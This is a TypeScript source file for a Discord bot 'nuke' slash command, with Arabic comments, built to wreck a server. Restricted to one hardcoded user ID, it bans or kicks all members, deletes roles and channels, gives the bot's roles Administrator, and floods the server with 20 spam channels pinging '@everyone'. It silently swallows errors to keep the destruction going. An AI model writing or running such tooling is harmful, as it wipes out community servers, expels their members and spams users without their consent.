// language: TypeScript, file: src/commands/nuke.ts
import { SlashCommandBuilder, PermissionFlagsBits, ChannelType, ChatInputCommandInteraction, Client, GuildChannel } from 'discord.js';

export default {
    data: new SlashCommandBuilder()
        .setName('nuke')
        .setDescription('تخريب شامل بأقصى سرعة')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

    async execute(interaction: ChatInputCommandInteraction, client: Client) {
        const allowed = ['1342238662368296980']; // حط ID حسابك هنا
        if (!allowed.includes(interaction.user.id)) {
            return interaction.reply({ content: 'مش مسموح.', ephemeral: true });
        }

        await interaction.reply({ content: 'NUKE STARTED 💀', ephemeral: true }).catch(() => {});

        const guild = interaction.guild;
        if (!guild) return;

        const me = client.user?.id;
        const owner = interaction.user.id;

        // 1. حظر وطرد الأعضاء
        try {
            const members = await guild.members.fetch();
            for (const [id, member] of members) {
                if (id === me || id === owner) continue;
                
                if (member.bannable) {
                    await member.ban({ reason: 'Nuke Command' }).catch(() => {});
                } else if (member.kickable) {
                    await member.kick('Nuke Command').catch(() => {});
                }
                await new Promise(r => setTimeout(r, 200)); 
            }
        } catch (e) {}

        // 2. مسح الرولات
        try {
            const roles = await guild.roles.fetch();
            for (const [id, role] of roles) {
                if (id === guild.id || !role.editable) continue;
                
                if (me && role.members.has(me)) {
                    await role.setPermissions([PermissionFlagsBits.Administrator]).catch(() => {});
                } else {
                    await role.delete('Nuke Command').catch(() => {});
                }
                await new Promise(r => setTimeout(r, 250));
            }
        } catch (e) {}

        // 3. مسح القنوات
        try {
            const channels = await guild.channels.fetch();
            for (const [id, channel] of channels) {
                // إضافة '!' عشان نطمن TypeScript إن القناة مش null
                await channel!.delete('Nuke Command').catch(() => {});
                await new Promise(r => setTimeout(r, 250));
            }
        } catch (e) {}

        // 4. سبام قنوات
        for (let i = 0; i < 20; i++) {
            try {
                const newCh = await guild.channels.create({
                    name: `nuked-${Math.random().toString(36).slice(2, 7)}`,
                    type: ChannelType.GuildText,
                }).catch(() => null);

                if (newCh) {
                    await newCh.send('@everyone @here NUKED 💀').catch(() => {});
                }
                await new Promise(r => setTimeout(r, 300));
            } catch {}
        }
    }
};